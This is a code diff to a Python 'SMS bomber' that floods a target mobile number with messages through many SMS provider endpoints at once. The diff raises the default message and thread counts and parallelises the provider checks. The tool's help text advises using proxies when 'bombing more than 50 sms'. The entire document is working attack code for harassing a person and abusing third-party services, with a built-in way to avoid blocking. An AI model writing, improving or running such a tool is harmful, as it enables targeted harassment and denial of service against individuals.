@@ -13,11 +13,11 @@ parser = argparse.ArgumentParser()
 parser.add_argument('target', metavar='TARGET', type=lambda value: (_ for _ in ()).throw(argparse.ArgumentTypeError(f'{value} is an invalid mobile number')) if len(value) != 10 else value,
                     help='Target mobile number without country code')
 parser.add_argument('--sms', '-S', type=int,
-                    help='Number of sms to target (default: 10)', default=10)
+                    help='Number of sms to target (default: 20)', default=20)
 parser.add_argument('--country', '-c', type=int,
                     help='Country code without (+) sign (default: 91)', default=91)
 parser.add_argument('--threads', '-T', type=int,
-                    help='Max number of concurrent HTTP(s) requests (default: 10)', default=10)
+                    help='Max number of concurrent HTTP(s) requests (default: 20)', default=20)
 parser.add_argument('--proxy', '-p', action='store_true',
                     help='Use proxy for bombing (It is advisable to use this option if you are bombing more than 50 sms)')
 parser.add_argument('--verbose', '-v', action='store_true',
@@ -50,13 +50,14 @@ def get_proxy():
 
 
 proxies = get_proxy() if args.proxy else False
+# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 # bomber function
 
 
 def bomber(p):
     global fails, success, no_of_sms
-    if p is None or success > no_of_sms:
+    if not args.verify and p is None or success > no_of_sms:
         return
     elif not p.done:
         try:
@@ -76,22 +77,19 @@ def bomber(p):
 # threadsssss
 start = time.time()
 if args.verify:
-    conf = json.load(open('config.json', 'r'))['providers']
-    for key, value in conf.items():
-        if args.country and key != 'multi' and str(args.country) != key:
-            continue
-        for i in value:
-            p = Provider(target, proxy=proxies,
-                         verbose=True, cc=str(args.country))
-            p.config = i
-            p._headers()
-            bomber(p)
+    providers = json.load(open('config.json', 'r'))['providers']
+    pall = [p for x in providers.values() for p in x]
+    with ThreadPoolExecutor(max_workers=len(pall)) as executor:
+        for config in pall:
+            executor.submit(bomber, Provider(target, proxy=proxies,
+                    verbose=True, cc=str(args.country), config=config))
+        print(f'Total {len(pall)} providers available')
 else:
     with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
         for i in range(no_of_sms):
             p = Provider(target, proxy=proxies,
                          verbose=args.verbose, cc=str(args.country))
-            executor.submit(bomber, (p))
+            executor.submit(bomber, p)
 end = time.time()
 
 
